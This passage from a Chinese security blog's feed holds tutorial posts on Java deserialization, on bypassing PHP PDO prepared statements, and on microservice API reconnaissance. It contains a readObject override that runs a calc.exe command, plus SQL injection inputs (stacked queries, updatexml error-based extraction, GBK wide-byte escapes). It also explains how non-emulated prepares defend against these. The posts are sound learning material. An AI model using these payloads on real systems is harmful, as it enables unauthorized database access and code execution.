src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>序列化的内容实验好了，我们继续往下看看反序列化的实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><p>程序在执行完对象输入流的<strong>readObject方法</strong>后，可见反序列化的得到的新对象student1的属性和原对象student的属性时一样的。OK，自此序列化和反序列化的触发点和具体展示效果实验结束。</p><h2 id="0x02-特点"><a href="#0x02-特点" class="headerlink" title="0x02 特点"></a>0x02 特点</h2><p>Java的序列化常见一般是通过两种方式：</p><ul><li>实现 Serializable 接口。</li><li>实现 Externalizable 接口。</li></ul><p>实现Serialize接口的序列化注意点有：</p><ul><li>序列化时，不会序列化<strong>静态变量</strong>，因为只有堆内存会被序列化，所以静态变量会天生不会被序列化。</li><li>序列化时，不会序列化<strong>transient</strong>修饰的变量，也就是通过序列化后再被反序列化后读取这个变量不会有值。</li><li>反序列化时，不会调用对象的任何<strong>构造方法</strong>。</li></ul><p>为了验证上面的特性，我对原来的代码进行一些小修改：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>我把两个属性分别加上静态声明和transient进行声明，重新进行序列化和反序列化操作，得到的结果如下：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt></p><p>可以看到我们的用<strong>transient修饰</strong>的属性反序列化为空了，原因在于序列化的时候不会序列化其修饰的属性，所以自然为空。但是这里会有个奇怪的地方，为什么<strong>static修饰</strong>的静态变量也没写入文件，怎么反序列化会有值？</p><blockquote><p>这里被static修饰的变量反序列化后有值是因为：静态变量在方法区,本来流里面就没有写入静态变量,我们打印静态变量当然会去方法区查找。我们当前jvm中有，所以静态变量在序列化后仍然有值。 </p><p>由此可以看出 static 修饰的变量本身是不会被序列化的。我们读取的值是当前jvm中的方法区对应此变量的值，所以最后输出的值为我们对static变量后赋的值。</p></blockquote><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><p>我们通过生成的文件也可以看出来，两个被修饰变量都没有被保存进序列化文件中。</p><h2 id="0x03-简单实验"><a href="#0x03-简单实验" class="headerlink" title="0x03 简单实验"></a>0x03 简单实验</h2><p>前面我们能知道序列化过程依赖于 ObjectOutputStream 类中 <strong>writeObject</strong> 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 <strong>readObject</strong> 方法。 如果实际情况下，我们能够重写 <strong>readObject</strong> 方法，那么就有可能达到反序列化的时候命令执行的作用。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="comment">//控制了反序列化的具体实现，将来攻击的地方就是在于控制它反序列化时执行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream input)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数入口</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Calc calc = <span class="keyword">new</span> Calc();</span><br><span class="line"><span class="comment">//序列化过程，写入被我们控制的了的序列化对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">oos.writeObject(calc);</span><br><span class="line">oos.close();</span><br><span class="line"><span class="comment">//反序列化过程，会反序列化出被我们控制了的对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">Calc pwnedcalc = (Calc)ois.readObject();</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只是简单的演示一下最经典的弹计算器，OK我们已经实现被我们<strong>控制的类Serialize接口的实现为弹出计算器</strong>，为了简单我也把序列化和反序列化过程一次写在主函数中，然后我们执行：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt></p><p>成功弹出了计算器。</p><blockquote><p>流程总结：实现了Serialize接口的可被反序列化的Calc类被序列化进shabi.txt文件 -&gt; 从shabi.txt文件中恢复对象 -&gt; 调用被恢复对象的readObject方法 -&gt; 命令执行弹出计算器</p></blockquote><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>这一篇主要是简单写一下关于Java的反序列化的一些简单知识，后面才会具体加上一些例子来Java反序列化的漏洞，前路漫漫，继续努力！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java反序列化&quot;&gt;&lt;a href=&quot;#Java反序列化&quot; class=&quot;headerlink&quot; title=&quot;Java反序列化&quot;&gt;&lt;/a&gt;Java反序列化&lt;/h1&gt;&lt;p&gt;没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译绕过</title>
    <link href="http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/</id>
    <published>2020-03-24T03:37:39.000Z</published>
    <updated>2020-07-16T13:26:54.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译绕过"><a href="#SQL预编译绕过" class="headerlink" title="SQL预编译绕过"></a>SQL预编译绕过</h1><p>众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万无一失吗？下面通过PHP的PDO进行一番探究。</p><h2 id="0x00-PDO相关配置"><a href="#0x00-PDO相关配置" class="headerlink" title="0x00 PDO相关配置"></a>0x00 PDO相关配置</h2><blockquote><p>PDO::ATTR_EMULATE_PREPARES</p><p>PDO::ATTR_ERRMODE</p><p>PDO::MYSQL_ATTR_MULTI_STATEMENTS</p></blockquote><p>在PDO中，与安全性相关的选项就是上面的三个，分别对应着：模拟预编译，报错，多条执行。</p><h2 id="0x01-动态拼接语句"><a href="#0x01-动态拼接语句" class="headerlink" title="0x01 动态拼接语句"></a>0x01 动态拼接语句</h2><p>下面各个小章节的PDO都由下面的代码执行，其中SQL预编译语句时使用了动态的<strong>参数拼接</strong>（.$_GET[‘field’].）。这是导致错误的最重要因素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$sql = <span class="string">"select id,"</span>.$_GET[<span class="string">'field'</span>].<span class="string">" from user where username = ?"</span>;</span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">$stmt-&gt;bindParam(<span class="number">1</span>,$username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"><span class="keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    var_dump($row);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01-开启多条执行"><a href="#01-开启多条执行" class="headerlink" title="01.开启多条执行"></a>01.开启多条执行</h3><p>当开启了多条执行时，不论另外两个参数的选项是什么，都可以照成堆叠注入查询多个结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=username from user;select id</span><br></pre></td></tr></table></figure><p>因为开启动态拼接，模板语句会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">"admin"</span></span><br></pre></td></tr></table></figure><p>然后因为开启了多条执行，会导致两个查询语句都被执行，照成堆叠注入。</p><blockquote><p>结论：开启多条执行选项 + 模板语句动态拼接能导致堆叠注入。</p></blockquote><h3 id="02-开启多条执行-报错"><a href="#02-开启多条执行-报错" class="headerlink" title="02.开启多条执行+报错"></a>02.开启多条执行+报错</h3><p>当开启了多条执行和报错时，不论是否开启了非模拟编译，照样同上例可以通过堆叠加报错进行注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e)from user;select id</span><br></pre></td></tr></table></figure><p>拼接到模板语句上面就会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>然后因为开启了报错模式，会导致第一次查询就报错获得结果（我们通过报错信息获得我们要查询的信息）。然后SQL查询报错据推出，第二条正常语句不会执行。</p><blockquote><p>结论：开启多条执行+开启报错执行+模板语句动态拼接能导致报错注入。</p></blockquote><h3 id="03-单独开启报错"><a href="#03-单独开启报错" class="headerlink" title="03.单独开启报错"></a>03.单独开启报错</h3><p>对于多条执行+报错的条件，让我们不禁思考：如果单独开启报错选项，而不能多条执行，还能成功吗？答案是可以的。拼接完的语句依然是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>这时候因为没开启多条执行，只能查询一句SQL，所以只会执行报错查询语句（但我们的目的已经达成了）</p><blockquote><p>结论：开启报错执行+模板语句动态拼接，假如报错查询在第一条查询的位置，就能导致报错注入。</p></blockquote><h2 id="0x02-正常绑定语句"><a href="#0x02-正常绑定语句" class="headerlink" title="0x02 正常绑定语句"></a>0x02 正常绑定语句</h2><p>上面章节的导致的注入的其实很傻逼，那是因为它准备的模板语句是动态拼接的，这样和普通的SQL根本没啥区别。</p><p>但如果我们在查询语句中没有可控的参数，并把输入的参数按照prepare-&gt;bindParam-&gt;execute的方式去写就一定没有问题了吗？下面是我们的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><h3 id="01-开启模拟编译-多条执行"><a href="#01-开启模拟编译-多条执行" class="headerlink" title="01.开启模拟编译+多条执行"></a>01.开启模拟编译+多条执行</h3><p>我们看下面的代码，模板语句没有拼接，用了占位符绑定参数，看起来很正常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><p>我们在URL中随便输入一个参数：?id=asdasd，然后通过设置SET GLOBAL GENERAL_LOG=ON，从log里看出究竟执行了什么：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/1.png" alt></p><p>我们发现<strong>模拟预编译</strong>的请求发送方式和以往的mysqli并没有什么区别。而且对参数使用<strong>单引号</strong>进行了包裹。于是我们可以尝试输入一些特殊字符，比如单引号： </p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/2.png" alt></p><p>可以看到，他在我们输入的单引号前加上了反斜杠进行转义，自然我们想到了宽字节注入。可见GBK编码下，单引号逃逸了出来。并且因为我们开启了多条执行，所以后面的查询也执行了：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/3.png" alt></p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，在模拟编译下可以逃逸出单引进行宽字节注入；并且开启多条执行选项下也照样能堆叠注入。</p></blockquote><h3 id="02-单独开启模拟编译"><a href="#02-单独开启模拟编译" class="headerlink" title="02.单独开启模拟编译"></a>02.单独开启模拟编译</h3><p>要是我们关闭了多条语句查询呢，我们就可以利用联合查询加宽字节来注入吗？答案是可以的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/4.png" alt></p><p>可以看到使用union进行联合注入也是可以成功注入的，根本不需要进行多句执行（即开不开开启多条查询选项都可以）。 </p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，即使仅开启了模拟编译，也可以宽字节逃逸单引号配合联合查询来进行注入。</p></blockquote><h3 id="03-模拟编译与非模拟编译之差"><a href="#03-模拟编译与非模拟编译之差" class="headerlink" title="03.模拟编译与非模拟编译之差"></a>03.模拟编译与非模拟编译之差</h3><p>模拟编译：</p><blockquote><p>在模拟预编译的情况下，PDO对于SQL注入的防范（PDO::queto()），无非就是将数字型的注入转变为字符型的注入，又用类似mysql_real_escape_string()的方法将单引号、双引号、反斜杠等字符进行了转义。所以GBK编码下是能使用<strong>宽字节</strong>进行绕过的。 </p></blockquote><p>非模拟编译：</p><blockquote><p>它对每一句sql语句都进行了预编译和执行两个操作。在执行select balabala from table1 where 1=?这句时，如果是<strong>GBK编码</strong>，那么它将会把?绑定的参数转化成<strong>16进制</strong>，无论输入什么都无法再进行注入。</p></blockquote><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/5.png" alt></p><h3 id="04-非模拟编译效果"><a href="#04-非模拟编译效果" class="headerlink" title="04.非模拟编译效果"></a>04.非模拟编译效果</h3><p>PDO的原理，与Mysql中prepare语句是一样的。上面PDO所执行的SQL语句，用如下的方式可以等效替代： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> @x=<span class="number">0x31</span></span><br><span class="line"><span class="keyword">Prepare</span> a <span class="keyword">from</span> “<span class="keyword">select</span> balabala <span class="keyword">from</span> table1 <span class="keyword">where</span> <span class="number">1</span>=?”</span><br><span class="line"><span class="keyword">Execute</span> a <span class="keyword">using</span> @x</span><br></pre></td></tr></table></figure><blockquote><p>即PDO译原理相当于将参数设置为@x，并转换为十六进制，随后预编译并执行。</p></blockquote><p>PDO中使用非模拟编译的效果也可以通过下面代码实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$db = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'pdotest'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id = <span class="string">"0x"</span>.bin2hex($_GET[<span class="string">'id'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"id:"</span>.$id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"set @x=&#123;$id&#125;"</span>);</span><br><span class="line">$db-&gt;query(<span class="string">"prepare a from 'select balabala from table1 where 1=?'"</span>);</span><br><span class="line">$row = $db-&gt;query(<span class="string">"execute a using @x"</span>);</span><br><span class="line">$result = $row-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>($result)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"结果为："</span>;</span><br><span class="line">print_r($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其运行的结果和使用PDO是一致的：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/6.png" alt></p><h2 id="0x03-场景小结"><a href="#0x03-场景小结" class="headerlink" title="0x03 场景小结"></a>0x03 场景小结</h2><ul><li><p>动态拼接模板语句</p><ul><li>仅开启多条查询：堆叠注入。</li><li>仅开启报错（报错语句必须是第一条）：报错注入。</li><li>开启报错和多条查询：报错注入+堆叠注入。</li></ul></li><li><p>固定模板语句并正常绑定参数</p><ul><li>仅开启模拟编译：宽字节注入。</li><li>开启模拟编译和多条查询：宽字节注入+堆叠注入。</li></ul></li><li><p>非模拟编译防御原理</p><ul><li>绑定参数为GBK编码时，将参数转为十六进制。</li></ul></li></ul><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a> </p><p><a href="https://cloud.tencent.com/developer/news/388755" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/388755</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译绕过&quot;&gt;&lt;a href=&quot;#SQL预编译绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译绕过&quot;&gt;&lt;/a&gt;SQL预编译绕过&lt;/h1&gt;&lt;p&gt;众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>微服务API利用</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/</id>
    <published>2020-03-23T09:31:58.000Z</published>
    <updated>2020-03-24T02:52:24.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="微服务API利用"><a href="#微服务API利用" class="headerlink" title="微服务API利用"></a>微服务API利用</h1><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/1.png" alt></p><p>上面是WEB发展的架构变化，下面我们粗略的看看每一个时期的不同的WEB架构特点。</p><h2 id="0x00-单一应用架构"><a href="#0x00-单一应用架构" class="headerlink" title="0x00 单一应用架构"></a>0x00 单一应用架构</h2><p>当网站流量很小时，只需一个应用，将<strong>所有功能</strong>都部署在一起，以减少部署节点和成本。此时，用于简化增删改查工作量的数据访问框架(ORM)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/2.png" alt></p><h2 id="0x01-垂直应用架构"><a href="#0x01-垂直应用架构" class="headerlink" title="0x01 垂直应用架构"></a>0x01 垂直应用架构</h2><p>当访问量逐渐增大，单一应用增加机器带来的加速度越来越小，将应用<strong>拆成</strong>互不相干的几个应用，以提升效率。此时，用于加速前端页面开发的Web框架(MVC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/3.png" alt></p><h2 id="0x02-分布式服务架构"><a href="#0x02-分布式服务架构" class="headerlink" title="0x02 分布式服务架构"></a>0x02 分布式服务架构</h2><p>当垂直应用越来越多，应用之间交互不可避免，将核心业务抽取出来，作为独立的服务，逐渐形成稳定的服务中心，使前端应用能更快速的响应多变的市场需求。此时，用于提高业务复用及整合的分布式服务框架(RPC)是关键。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/4.png" alt></p><h2 id="0x03-流动计算架构"><a href="#0x03-流动计算架构" class="headerlink" title="0x03 流动计算架构"></a>0x03 流动计算架构</h2><p>当服务越来越多，容量的评估，小服务资源的浪费等问题逐渐显现，此时需增加一个调度中心基于访问压力实时管理集群容量，提高集群利用率。此时，用于提高机器利用率的资源调度和治理中心(SOA)是关键。</p><h2 id="0x04-微服务"><a href="#0x04-微服务" class="headerlink" title="0x04 微服务"></a>0x04 微服务</h2><p>微服务架构是一种架构模式，它提倡将<strong>单一应用程序划分成一组小的服务</strong>，服务之间相互协调、互相配合，为用户提供最终价值。每个服务运行在其独立的进程中，服务和服务之间采用轻量级的通信机制相互沟通（通常是基于HTTP的Restful API)。每个服务都围绕着具体的业务进行构建，并且能够被独立的部署到生产环境、类生产环境等。另外，应尽量避免统一的、集中的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构造。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/5.png" alt></p><h2 id="0x05-API下信息收集"><a href="#0x05-API下信息收集" class="headerlink" title="0x05 API下信息收集"></a>0x05 API下信息收集</h2><blockquote><p>学习了微服务的架构后，我们知道：假如API没有对请求做验证或者可以伪造认证信息，就会导致API接口直接被我们访问。然后我们可以通过FUZZ出API的接口模式（REST风格就改请求方法；其他可以尝试添加uri参数去爆破等），尝试去获取到其提供的数据。</p></blockquote><h3 id="1-微信小程序"><a href="#1-微信小程序" class="headerlink" title="1)  微信小程序"></a>1)  微信小程序</h3><p>许多和目标相关的URL我们无法通过以前的方式搜集到，那么如果目标存在微信小程序，那么我们可以尝试从微信小程序收集些信息。 <strong>微信小程序 -&gt; 更多资料</strong>。</p><h3 id="2-JS文件"><a href="#2-JS文件" class="headerlink" title="2)  JS文件"></a>2)  JS文件</h3><p>JS里面蕴藏了很多有意思的内容，除了大量的<strong>域名</strong>之外，其中最重要的莫过于<strong>目录和参数</strong>。通过JS发现的目录和参数收集起来，组成字典，通过fuzz的思想进行随机组合，会有很多惊喜的出现，出现的这些内容是以往的信息收集无法找到的 。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/7.png" alt></p><blockquote><p>通过JS我们能找到很多和目标相关的信息，其中包括大量的子域名和相关的url，重要的是一些api信息。 </p></blockquote><h3 id="3-爆破参数"><a href="#3-爆破参数" class="headerlink" title="3) 爆破参数"></a>3) 爆破参数</h3><p>即使FUZZ出API的路径，但是访问后提示403是最常见的一种情况。我们猜测是缺少参数。</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/6.png" alt></p><p>这时候我们就可以通过收集的大量的参数进行FUZZ（以前是爆破后台等，现在是爆破参数）。如下图对参数以及其值进行爆破。当然API的命名很有规律，有时灵光一现就能直接FUZZ出他的值：</p><p><img src="/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1API%E5%88%A9%E7%94%A8/8.png" alt></p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><p>之前会被拉到这方面是因为不太理解API的概念，一知半解。在询问了研发同学加上文章后，就有了一定的认识，瞬间有了关于API方面的漏洞挖掘的思路。刚好看到freebuf上有类似的文章，就转载一下。继续努力吧！</p><p>参考链接：</p><p><a href="https://www.freebuf.com/articles/web/224605.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/224605.html</a> </p><p><a href="https://www.cnblogs.com/jsjwk/p/10769246.html" target="_blank" rel="noopener">https://www.cnblogs.com/jsjwk/p/10769246.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;微服务API利用&quot;&gt;&lt;a href=&quot;#微服务API利用&quot; class=&quot;headerlink&quot; title=&quot;微服务API利用&quot;&gt;&lt;/a&gt;微服务API利用&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/03/23/%E5%BE%AE%E6%9C%8D%E5%8A
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="http://bai-ren-1.github.io/2020/03/23/JWT/"/>
    <id>http://bai-ren-1.github.io/2020/03/23/JWT/</id>
    <published>2020-03-23T06:35:07.000Z</published>
    <updated>2020-03-24T09:14:25.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>上面两篇博客我们使用的是基于cookie/session来进行<strong>身份认证</strong>。今天就来说一说基于token的身份认证。token中一种常用的形式就是JSON WEB TOKEN，也就是JWT。首先我们从session认证和token认证入手。</p><h2 id="0x00-基于session认证"><a href="#0x00-基于session认证" class="headerlink" title="0x00 基于session认证"></a>0x00 基于session认证</h2><blockquote><p>基于Session的认证一直处于主流地位。由于http协议是无状态的，借助cookie，客户端登陆成功后，服务端就能识别其后续请求，而不需要每次都登陆。它是<strong>有状态的</strong>，即服务端和客户端都需要保存生成的<strong>session</strong>。</p></blockquote><h3 id="基于session认证的流程"><a href="#基于session认证的流程" class="headerlink" 